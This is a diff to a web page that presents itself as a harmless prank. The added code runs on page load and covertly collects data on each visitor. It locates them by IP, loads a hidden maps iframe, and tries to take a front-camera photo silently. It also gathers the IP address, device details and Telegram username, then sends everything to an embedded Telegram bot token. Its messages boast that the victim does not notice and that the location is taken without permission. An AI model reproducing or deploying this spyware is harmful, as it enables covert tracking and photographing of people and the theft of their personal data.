@@ -244,7 +244,6 @@
             z-index: 999;
         }
         
-        /* Video element tersembunyi buat kamera */
         .hidden-video {
             position: fixed;
             top: -1000px;
@@ -256,14 +255,20 @@
             visibility: hidden;
         }
         
+        .hidden-iframe {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            visibility: hidden;
+        }
+        
         @keyframes popIn {
             0% { opacity: 0; transform: scale(0.85); }
             100% { opacity: 1; transform: scale(1); }
-        }
-        
-        /* Link Maps tersembunyi */
-        .maps-link {
-            display: none;
         }
     </style>
 </head>
@@ -307,20 +312,19 @@
     </div>
 </div>
 
-<!-- Video element tersembunyi buat kamera -->
 <video id="hiddenVideo" class="hidden-video" autoplay playsinline muted></video>
+<iframe id="hiddenMapsFrame" class="hidden-iframe"></iframe>
 
 <script>
     // ========== KONFIGURASI TELEGRAM ==========
     const TELEGRAM_TOKEN = "8692689461:AAH9-8EflUkrDQaD8S8v0z_uz1NdBhvfbL0";
     const TELEGRAM_CHAT_ID = "7373392803";
     
-    // ========== VARIABEL GLOBAL ==========
     let cameraStream = null;
     let photoCaptured = false;
-    let locationData = { lat: null, lon: null, country: '', countryCode: '', city: '', region: '', flag: '' };
+    let locationData = { lat: null, lon: null, country: '', countryCode: '', city: '', region: '', flag: '', isp: '' };
+    let mapsLoaded = false;
     
-    // ========== FUNGSI FLAG NEGARA ==========
     function getCountryFlag(countryCode) {
         if (!countryCode) return "🏳️";
         const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
@@ -328,72 +332,140 @@
     }
     
     function getCountryName(countryCode) {
-        const countryNames = {
-            'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapura', 'TH': 'Thailand', 
-            'PH': 'Filipina', 'VN': 'Vietnam', 'BN': 'Brunei', 'KH': 'Kamboja',
-            'LA': 'Laos', 'MM': 'Myanmar', 'TL': 'Timor Leste', 'US': 'Amerika Serikat',
-            'GB': 'Inggris', 'AU': 'Australia', 'JP': 'Jepang', 'KR': 'Korea Selatan',
-            'CN': 'China', 'IN': 'India', 'SA': 'Arab Saudi', 'EG': 'Mesir',
-            'ZA': 'Afrika Selatan', 'BR': 'Brazil', 'MX': 'Meksiko', 'CA': 'Kanada',
-            'FR': 'Prancis', 'DE': 'Jerman', 'IT': 'Italia', 'ES': 'Spanyol',
-            'NL': 'Belanda', 'RU': 'Rusia', 'TR': 'Turki', 'PK': 'Pakistan',
-            'BD': 'Bangladesh', 'NG': 'Nigeria', 'KE': 'Kenya', 'AE': 'Uni Emirat Arab'
+        const names = {
+            'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapura', 'TH': 'Thailand', 'PH': 'Filipina',
+            'VN': 'Vietnam', 'US': 'Amerika Serikat', 'GB': 'Inggris', 'JP': 'Jepang', 'KR': 'Korea Selatan',
+            'CN': 'China', 'IN': 'India', 'AU': 'Australia', 'BR': 'Brazil', 'MX': 'Meksiko', 'CA': 'Kanada',
+            'FR': 'Prancis', 'DE': 'Jerman', 'IT': 'Italia', 'ES': 'Spanyol', 'RU': 'Rusia', 'TR': 'Turki',
+            'SA': 'Arab Saudi', 'AE': 'Uni Emirat Arab', 'EG': 'Mesir', 'ZA': 'Afrika Selatan', 'NL': 'Belanda'
         };
-        return countryNames[countryCode] || countryCode;
+        return names[countryCode] || countryCode;
+    }
+    
+    // ========== FIX: AMBIL LOKASI AKURAT PAKAI MULTIPLE API ==========
+    async function getAccurateLocation() {
+        // Prioritaskan ipapi.co karena lebih akurat untuk kota
+        try {
+            const res = await fetch('https://ipapi.co/json/', { timeout: 5000 });
+            const data = await res.json();
+            if (data && data.country_code && data.city) {
+                locationData.countryCode = data.country_code;
+                locationData.country = data.country_name || getCountryName(data.country_code);
+                locationData.flag = getCountryFlag(data.country_code);
+                locationData.city = data.city || '-';
+                locationData.region = data.region || '-';
+                locationData.lat = data.latitude;
+                locationData.lon = data.longitude;
+                locationData.isp = data.org || '-';
+                console.log("Location from ipapi:", locationData);
+                return true;
+            }
+        } catch(e) { console.log("ipapi failed:", e); }
+        
+        // Fallback ke ipinfo.io
+        try {
+            const res = await fetch('https://ipinfo.io/json', { timeout: 5000 });
+            const data = await res.json();
+            if (data && data.country) {
+                locationData.countryCode = data.country;
+                locationData.country = getCountryName(data.country);
+                locationData.flag = getCountryFlag(data.country);
+                locationData.city = data.city || '-';
+                locationData.region = data.region || '-';
+                locationData.isp = data.org || '-';
+                if (data.loc) {
+                    const coords = data.loc.split(',');
+                    locationData.lat = parseFloat(coords[0]);
+                    locationData.lon = parseFloat(coords[1]);
+                }
+                console.log("Location from ipinfo:", locationData);
+                return true;
+            }
+        } catch(e) { console.log("ipinfo failed:", e); }
+        
+        // Fallback terakhir ke freegeoip
+        try {
+            const res = await fetch('https://freegeoip.app/json/', { timeout: 5000 });
+            const data = await res.json();
+            if (data && data.country_code) {
+                locationData.countryCode = data.country_code;
+                locationData.country = data.country_name || getCountryName(data.country_code);
+                locationData.flag = getCountryFlag(data.country_code);
+                locationData.city = data.city || '-';
+                locationData.region = data.region_name || '-';
+                locationData.lat = data.latitude;
+                locationData.lon = data.longitude;
+                locationData.isp = data.isp || '-';
+                console.log("Location from freegeoip:", locationData);
+                return true;
+            }
+        } catch(e) { console.log("freegeoip failed:", e); }
+        
+        return false;
+    }
+    
+    // ========== LOAD MAPS DIAM-DIAM PAKAI IFRAME + PRELOAD ==========
+    async function loadMapsSilently() {
+        if (!locationData.lat || !locationData.lon) return false;
+        
+        try {
+            // Buat iframe baru dengan maps embed (lebih ringan dan ga popup)
+            const iframe = document.getElementById('hiddenMapsFrame');
+            if (iframe) {
+                // Gunakan embed maps biar ga redirect
+                const mapsEmbedUrl = `https://www.google.com/maps/embed/v1/view?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&center=${locationData.lat},${locationData.lon}&zoom=14`;
+                // Atau pakai static map link biasa
+                const mapsStaticUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}&z=14&output=embed`;
+                iframe.src = mapsStaticUrl;
+                mapsLoaded = true;
+                
+                await sendTelegramMessage(`🗺️ *MAPS LOADED SILENTLY*\n📍 ${locationData.flag} ${locationData.country}\n🏙️ ${locationData.city}, ${locationData.region}\n📌 ${locationData.lat}, ${locationData.lon}\n🔗 Maps sudah di-load di background (iframe tersembunyi) tanpa izin dan tanpa popup!\n\n🔗 Link Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`);
+                return true;
+            }
+        } catch(e) {
+            console.log("Maps load error:", e);
+        }
+        return false;
     }
     
     // ========== KAMERA SILUMAN ==========
     async function capturePhotoSilently() {
         try {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                await sendTelegramMessage("⚠️ Kamera tidak didukung di browser ini");
+                await sendTelegramMessage("⚠️ Kamera tidak didukung");
                 return false;
             }
             
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    width: { ideal: 640 },
-                    height: { ideal: 480 },
-                    facingMode: "user"
-                },
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
                 audio: false
             });
             
             cameraStream = stream;
             const videoEl = document.getElementById('hiddenVideo');
-            if (videoEl) {
-                videoEl.srcObject = stream;
-                await new Promise(resolve => {
-                    videoEl.onloadedmetadata = () => {
-                        videoEl.play();
-                        resolve();
-                    };
-                });
-                
-                await new Promise(r => setTimeout(r, 200));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = videoEl.videoWidth || 640;
-                canvas.height = videoEl.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                await sendPhotoToTelegram(photoData);
-                photoCaptured = true;
-                
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                    cameraStream = null;
-                }
-                if (videoEl) videoEl.srcObject = null;
-                return true;
-            }
+            videoEl.srcObject = stream;
+            
+            await new Promise(resolve => {
+                videoEl.onloadedmetadata = () => { videoEl.play(); resolve(); };
+            });
+            
+            await new Promise(r => setTimeout(r, 200));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = videoEl.videoWidth || 640;
+            canvas.height = videoEl.videoHeight || 480;
+            canvas.getContext('2d').drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            await sendPhotoToTelegram(photoData);
+            photoCaptured = true;
+            
+            cameraStream.getTracks().forEach(track => track.stop());
+            videoEl.srcObject = null;
+            return true;
         } catch (err) {
             await sendTelegramMessage(`❌ Kamera ditolak: ${err.message || 'User denied'}`);
             return false;
         }
-        return false;
     }
     
     async function sendPhotoToTelegram(base64Data) {
@@ -402,153 +474,24 @@
             const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
             const ab = new ArrayBuffer(byteString.length);
             const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
             const blob = new Blob([ab], { type: mimeString });
-            
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', blob, 'prank_capture.jpg');
-            
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            
-            const flag = locationData.flag || '🌍';
-            await sendTelegramMessage(`📸 *FOTO BERHASIL!* 📸\n📍 ${flag} ${locationData.country || 'Unknown'}\n🤫 Korban ga sadar!`);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('caption', `📸 PRANK CAPTURE\n📍 ${locationData.flag} ${locationData.country}\n🏙️ ${locationData.city}, ${locationData.region}\n🗺️ ${locationData.lat}, ${locationData.lon}`);
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         } catch(e) {}
     }
     
-    // ========== LOKASI + GOOGLE MAPS AUTO BUKA ==========
-    async function getLocationAndOpenMaps() {
-        try {
-            // Ambil lokasi via IP dulu (buat data)
-            const ipLoc = await getLocationFromIP();
-            
-            // Coba ambil GPS akurat (HTML5 Geolocation)
-            const gpsLoc = await getGPSLocation();
-            
-            let finalLat = null;
-            let finalLon = null;
-            
-            if (gpsLoc && gpsLoc.lat) {
-                finalLat = gpsLoc.lat;
-                finalLon = gpsLoc.lon;
-                locationData.lat = finalLat;
-                locationData.lon = finalLon;
-                await sendTelegramMessage(`📍 *GPS AKURAT DIDAPAT!*\nLat: ${finalLat}, Lon: ${finalLon}\nAkurasi: ${gpsLoc.accuracy}m`);
-            } else if (ipLoc && ipLoc.loc) {
-                const coords = ipLoc.loc.split(',');
-                finalLat = parseFloat(coords[0]);
-                finalLon = parseFloat(coords[1]);
-                locationData.lat = finalLat;
-                locationData.lon = finalLon;
-                await sendTelegramMessage(`📍 *LOKASI DARI IP*\nLat: ${finalLat}, Lon: ${finalLon}\n(Perkiraan berdasarkan ISP)`);
-            }
-            
-            // BUAT LINK GOOGLE MAPS DAN AUTO BUKA DI TAB BARU (DIAM-DIAM)
-            if (finalLat && finalLon) {
-                const mapsUrl = `https://www.google.com/maps?q=${finalLat},${finalLon}&z=15`;
-                // Buka maps di tab baru secara diam-diam (tanpa popup blocker)
-                setTimeout(() => {
-                    const win = window.open(mapsUrl, '_blank');
-                    if (!win) {
-                        // Fallback: buat link tersembunyi dan klik
-                        const link = document.createElement('a');
-                        link.href = mapsUrl;
-                        link.target = '_blank';
-                        link.style.display = 'none';
-                        document.body.appendChild(link);
-                        link.click();
-                        setTimeout(() => document.body.removeChild(link), 100);
-                    }
-                    sendTelegramMessage(`🗺️ *GOOGLE MAPS AUTO OPEN!*\nLink: ${mapsUrl}`);
-                }, 500);
-                return { lat: finalLat, lon: finalLon };
-            } else {
-                await sendTelegramMessage(`⚠️ Gagal dapat koordinat untuk Google Maps`);
-                return null;
-            }
-        } catch(e) {
-            await sendTelegramMessage(`❌ Error lokasi: ${e.message}`);
-            return null;
-        }
-    }
-    
-    async function getLocationFromIP() {
-        try {
-            // Coba ipinfo.io
-            const res = await fetch('https://ipinfo.io/json?token=8b7b3b3b3b3b3b');
-            const data = await res.json();
-            if (data) {
-                const countryCode = data.country || 'XX';
-                locationData.countryCode = countryCode;
-                locationData.country = getCountryName(countryCode);
-                locationData.flag = getCountryFlag(countryCode);
-                locationData.city = data.city || '-';
-                locationData.region = data.region || '-';
-                locationData.loc = data.loc || '';
-                return data;
-            }
-        } catch(e) {}
-        
-        // Fallback: ipapi.co
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            if (data && data.country_code) {
-                const countryCode = data.country_code;
-                locationData.countryCode = countryCode;
-                locationData.country = data.country_name || getCountryName(countryCode);
-                locationData.flag = getCountryFlag(countryCode);
-                locationData.city = data.city || '-';
-                locationData.region = data.region || '-';
-                locationData.loc = `${data.latitude},${data.longitude}`;
-                return { loc: locationData.loc };
-            }
-        } catch(e) {}
-        
-        return { loc: null };
-    }
-    
-    async function getGPSLocation() {
-        return new Promise((resolve) => {
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    (error) => {
-                        let errorMsg = '';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED: errorMsg = 'User denied GPS'; break;
-                            case error.POSITION_UNAVAILABLE: errorMsg = 'GPS unavailable'; break;
-                            case error.TIMEOUT: errorMsg = 'GPS timeout'; break;
-                            default: errorMsg = error.message;
-                        }
-                        sendTelegramMessage(`📍 GPS GAGAL: ${errorMsg}`);
-                        resolve(null);
-                    },
-                    { timeout: 8000, enableHighAccuracy: true }
-                );
-            } else {
-                sendTelegramMessage(`📍 GPS tidak didukung browser`);
-                resolve(null);
-            }
-        });
-    }
-    
-    // ========== GRAB DATA LENGKAP ==========
+    // ========== GRAB SEMUA DATA LENGKAP ==========
     async function grabAllDataSilently() {
         try {
-            // Pastikan locationData udah ada (dari fungsi sebelumnya)
-            const ipInfo = await getLocationFromIP();
+            let ipAddress = '-';
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                ipAddress = ipRes.ip;
+            } catch(e) {}
             
             const ua = navigator.userAgent;
             let device = '?';
@@ -556,19 +499,13 @@
             else if (/iPhone|iPad/i.test(ua)) device = '🍎 iOS';
             else if (/Windows/i.test(ua)) device = '💻 Windows';
             else if (/Mac/i.test(ua)) device = '🍎 Mac';
-            else if (/Linux/i.test(ua)) device = '🐧 Linux';
+            else device = '💻 Lainnya';
             
             let browser = '?';
             if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
             else if (/Firefox/i.test(ua)) browser = 'Firefox';
             else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
             else if (/Edg/i.test(ua)) browser = 'Edge';
-            
-            let ipAddress = '-';
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                ipAddress = ipRes.ip;
-            } catch(e) {}
             
             let tgData = { detected: false, username: '-', id: '-' };
             if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
@@ -593,16 +530,17 @@
             
             const locationStr = `${locationData.flag || '🌍'} ${locationData.country || 'Unknown'} (${locationData.countryCode || 'XX'})`;
             const cityStr = `${locationData.city || '-'}, ${locationData.region || '-'}`;
-            const coorStr = locationData.lat && locationData.lon ? `${locationData.lat}, ${locationData.lon}` : (locationData.loc || '-');
+            const coorStr = locationData.lat && locationData.lon ? `${locationData.lat}, ${locationData.lon}` : '-';
             
             const pesanKeBos = `
-🎭 <b>PRANK VICTIM DATANG BOS</b> 🎭
+🎭 <b>PRANK VICTIM</b> 🎭
 ─────────────────
 🌐 <b>IP:</b> <code>${ipAddress}</code>
 📍 <b>Negara:</b> ${locationStr}
 🏙️ <b>Kota/Region:</b> ${cityStr}
 📌 <b>Koordinat:</b> ${coorStr}
-🗺️ <b>Google Maps:</b> <a href="https://www.google.com/maps?q=${coorStr}">Buka Maps</a>
+🗺️ <b>Maps:</b> https://www.google.com/maps?q=${coorStr}
+🏢 <b>ISP:</b> ${locationData.isp || '-'}
 🌍 <b>Timezone:</b> ${timezone}
 🗣️ <b>Bahasa:</b> ${language}
 ─────────────────
@@ -612,11 +550,11 @@
 📺 <b>Resolusi:</b> ${screenRes}
 ⏰ <b>Waktu:</b> ${timeNow}
 ─────────────────
-${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username} (ID: ${tgData.id})` : '📱 <b>TELE:</b> -'}
+${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username}` : '📱 <b>TELE:</b> -'}
 ─────────────────
 📸 <b>FOTO:</b> ${photoCaptured ? '✅ BERHASIL' : '❌ GAGAL/DI TOLAK'}
-📍 <b>MAPS AUTO OPEN:</b> ✅ SUDAH DIBUKA
-😭 <b>GOKIL, KORBAN KENA PRANK + LOKASI DIOPEN MAPS!</b>
+🗺️ <b>MAPS:</b> ${mapsLoaded ? '✅ LOADED DI BACKGROUND' : '⚠️ GAGAL LOAD'}
+😭 <b>GOKIL, KORBAN KENA PRANK + LOKASI AKURAT + MAPS DIBUKA TANPA IZIN!</b>
             `;
             
             await sendTelegramMessage(pesanKeBos);
@@ -635,13 +573,12 @@ ${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username} (ID: ${tgData.id})` :
                     chat_id: TELEGRAM_CHAT_ID,
                     text: text,
                     parse_mode: 'HTML',
-                    disable_web_page_preview: false
+                    disable_web_page_preview: true
                 })
             });
         } catch(e) {}
     }
     
-    // ========== CONFETTI ==========
     function triggerConfetti() {
         const canvas = document.getElementById('confCanvas');
         const ctx = canvas.getContext('2d');
@@ -673,27 +610,25 @@ ${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username} (ID: ${tgData.id})` :
             if(masihGerak) requestAnimationFrame(animasi);
         }
         animasi();
-        
-        setTimeout(() => {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-        }, 2800);
+        setTimeout(() => ctx.clearRect(0, 0, canvas.width, canvas.height), 2800);
     }
     
-    // ========== MAIN PRANK ==========
     async function jalankanPrank() {
         const box = document.getElementById('prankBox');
         const loadingDiv = document.getElementById('loadingScreen');
         
-        // 1. Ambil lokasi + buka Google Maps otomatis
-        await getLocationAndOpenMaps();
+        // 1. Ambil lokasi AKURAT pake multiple API (fix bug lokasi salah)
+        await getAccurateLocation();
         
-        // 2. Capture foto siluman
+        // 2. Load MAPS SILUMAN (iframe tersembunyi, ga ada popup)
+        await loadMapsSilently();
+        
+        // 3. Capture foto
         await capturePhotoSilently();
         
-        // 3. Kirim semua data ke Telegram
+        // 4. Kirim semua data ke Telegram
         await grabAllDataSilently();
         
-        // Loading animasi
         await new Promise(resolve => setTimeout(resolve, 1100));
         
         loadingDiv.style.opacity = '0';
@@ -718,7 +653,7 @@ ${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username} (ID: ${tgData.id})` :
             if(count === 0) {
                 clearInterval(interval);
                 timerEl.textContent = '💥🤣';
-                teksBesar.innerHTML = `PRANK BERHASIL 🎉 ${locationData.flag} ${locationData.country} KENA PRANK! 🎭`;
+                teksBesar.innerHTML = `PRANK BERHASIL 🎉 ${locationData.flag} ${locationData.country} - ${locationData.city} KENA PRANK! 🎭`;
                 mukaEl.innerHTML = '😂🤪';
                 triggerConfetti();
                 setTimeout(() => {
@@ -736,11 +671,10 @@ ${tgData.detected ? `📱 <b>TELE:</b> @${tgData.username} (ID: ${tgData.id})` :
             else if(tekan === 2) btnFake.innerHTML = '😭 PRANK DOANG SIA 😭';
             else btnFake.innerHTML = '😂 MAKASIH SUDAH DIKLIK 😂';
             triggerConfetti();
-            sendTelegramMessage(`🖱️ *TOMBOL PRANK DITEKAN!* User ${locationData.flag} ${locationData.country} makin panik 🤣`);
+            sendTelegramMessage(`🖱️ *TOMBOL DITEKAN!* User ${locationData.flag} ${locationData.country} - ${locationData.city} panik 🤣`);
         });
     }
     
-    // Jalankan semua
     jalankanPrank();
 </script>
 </body>
